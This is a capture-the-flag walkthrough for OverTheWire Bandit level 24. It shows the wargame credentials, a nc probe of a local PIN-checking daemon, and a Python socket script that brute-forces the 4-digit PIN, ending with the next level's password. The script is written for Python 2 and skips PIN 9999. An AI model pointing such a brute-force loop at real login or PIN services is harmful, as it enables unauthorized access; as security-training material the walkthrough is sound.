#Level24
Connect to game via ssh on port 2220 using credentials bandit24:UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
_(format username:password)_
```sh
$ ssh -p 2220 bandit24@bandit.labs.overthewire.org
```

#Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

#Walkthrough
Lets try testing response of the application.
```sh
bandit24@bandit:/tmp/bandit24$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234
Wrong! Please enter the correct pincode. Try again.
1234 1234
Wrong! Please enter the correct current password. Try again.
^C
```
We notice that program greets us with text starting 'I am' then expects password and pin. In both cases when correct and incorrect password is sent we recive message back that starts with word 'Wrong!'. We will use this fact to detect when correct pin was sent.

Lets create python script in /tmp/bndit24 to brute-force pin.

```sh
bandit24@bandit:~$ mkdir /tmp/bandit24 && cd $_ && vim solve.py
```
Press i to enter insert mode then paste below code:
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002))

pw = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '
nl = '\n'
for pin in range(9999):
    text = pw + str(pin) + nl
    rcv = s.recv(2048)
    print(rcv.decode())
    if 'Wrong!' not in rcv.decode() and 'I am' not in rcv.decode():
        break
    print('Sending: ' + text)
    s.sendall(text)

s.close()
```
Press `:wq to save code and exit vim then execute script
```
bandit24@bandit:/tmp/bandit24$ python solve.py
```
After a while we get the hit:
```
Sending: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2588

Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```